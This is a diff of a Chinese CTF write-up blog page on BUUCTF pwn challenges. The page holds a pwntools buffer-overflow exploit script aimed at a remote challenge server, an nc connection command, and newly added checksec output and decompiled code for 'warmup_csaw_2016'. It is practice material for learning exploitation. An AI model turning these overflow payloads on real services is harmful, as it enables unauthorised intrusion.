@@ -87,7 +87,7 @@
 <meta property="og:site_name" content="Dooo">
 <meta property="og:description" content="BUUCTFtest_your_nc12345int __cdecl main(int argc, const char **argv, const char **envp)&amp;#123;  system(&quot;/bin/sh&quot;);  return 0;&amp;#125; nc连过去就能拿到flag 123➜  ~ nc node3.buuoj.cn 25826cat flagflag&amp;#123;f99db6">
 <meta property="og:locale" content="en">
-<meta property="og:updated_time" content="2020-05-11T14:57:35.520Z">
+<meta property="og:updated_time" content="2020-05-11T15:18:43.689Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="PWN从入门到放弃">
 <meta name="twitter:description" content="BUUCTFtest_your_nc12345int __cdecl main(int argc, const char **argv, const char **envp)&amp;#123;  system(&quot;/bin/sh&quot;);  return 0;&amp;#125; nc连过去就能拿到flag 123➜  ~ nc node3.buuoj.cn 25826cat flagflag&amp;#123;f99db6">
@@ -309,6 +309,9 @@
 <p>这里有个很坑的地方是服务器运行环境为ubuntu18，第一次在本地调的时候ret_addr=0x401186，这样在ubutnu16的环境下可以拿到shell，但是ubuntu18需要考虑对齐（刚开始还以为是服务器有问题，群里问了一下才知道是对齐的问题，具体参考这篇文章<a href="http://blog.eonew.cn/archives/958" target="_blank" rel="external">http://blog.eonew.cn/archives/958</a>），此处ret_addr=0x401187便可以拿到shell。</p>
 <p>EXP：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"></div><div class="line"><span class="comment">#p = process('./pwn1')</span></div><div class="line"></div><div class="line">p = remote(<span class="string">'node3.buuoj.cn'</span>,<span class="number">25783</span>)</div><div class="line">context.log_level = <span class="string">'debug'</span></div><div class="line">ret_addr = <span class="number">0x401187</span></div><div class="line">payload = <span class="string">'a'</span>*<span class="number">0xf</span> + <span class="string">'a'</span>*<span class="number">0x8</span> + p64(ret_addr)</div><div class="line"></div><div class="line">p.sendline(payload)</div><div class="line">p.interactive()</div></pre></td></tr></table></figure>
+<h4 id="warmup-csaw-2016"><a href="#warmup-csaw-2016" class="headerlink" title="warmup_csaw_2016"></a>warmup_csaw_2016</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">➜  warmup_csaw_2016 checksec warmup_csaw_2016 </div><div class="line">[*] '/mnt/hgfs/temp/pwn/BUUCTF/warmup_csaw_2016/warmup_csaw_2016'</div><div class="line">    Arch:     amd64-64-little</div><div class="line">    RELRO:    Partial RELRO</div><div class="line">    Stack:    No canary found</div><div class="line">    NX:       NX disabled</div><div class="line">    PIE:      No PIE (0x400000)</div><div class="line">    RWX:      Has RWX segments</div></pre></td></tr></table></figure>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">__int64 __<span class="function">fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">  <span class="keyword">char</span> s; <span class="comment">// [rsp+0h] [rbp-80h]</span></div><div class="line">  <span class="keyword">char</span> v5; <span class="comment">// [rsp+40h] [rbp-40h]</span></div><div class="line"></div><div class="line">  write(<span class="number">1</span>, <span class="string">"-Warm Up-\n"</span>, <span class="number">0xA</span>uLL);</div><div class="line">  write(<span class="number">1</span>, <span class="string">"WOW:"</span>, <span class="number">4u</span>LL);</div><div class="line">  <span class="built_in">sprintf</span>(&amp;s, <span class="string">"%p\n"</span>, sub_40060D);</div><div class="line">  write(<span class="number">1</span>, &amp;s, <span class="number">9u</span>LL);</div><div class="line">  write(<span class="number">1</span>, <span class="string">"&gt;"</span>, <span class="number">1u</span>LL);</div><div class="line">  <span class="keyword">return</span> gets(&amp;v5, <span class="string">"&gt;"</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub_40060D</span><span class="params">()</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">  <span class="keyword">return</span> system(<span class="string">"cat flag.txt"</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
 
       
     </div>
@@ -348,6 +351,10 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2020/05/12/常见c语言函数及其用法/" rel="prev" title="常见c语言函数及其用法">
+                常见c语言函数及其用法 <i class="fa fa-chevron-right"></i>
+              </a>
             
           </div>
         </div>
@@ -424,7 +431,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">7</span>
+                  <span class="site-state-item-count">8</span>
                   <span class="site-state-item-name">posts</span>
                 </a>
               </div>
@@ -446,7 +453,7 @@
               
               <div class="site-state-item site-state-tags">
                 
-                  <span class="site-state-item-count">7</span>
+                  <span class="site-state-item-count">8</span>
                   <span class="site-state-item-name">tags</span>
                 
               </div>
@@ -481,7 +488,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#BUUCTF"><span class="nav-number">1.</span> <span class="nav-text">BUUCTF</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#test-your-nc"><span class="nav-number">1.1.</span> <span class="nav-text">test_your_nc</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#rip"><span class="nav-number">1.2.</span> <span class="nav-text">rip</span></a></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#BUUCTF"><span class="nav-number">1.</span> <span class="nav-text">BUUCTF</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#test-your-nc"><span class="nav-number">1.1.</span> <span class="nav-text">test_your_nc</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#rip"><span class="nav-number">1.2.</span> <span class="nav-text">rip</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#warmup-csaw-2016"><span class="nav-number">1.3.</span> <span class="nav-text">warmup_csaw_2016</span></a></li></ol></li></ol></div>
             
 
           </div>
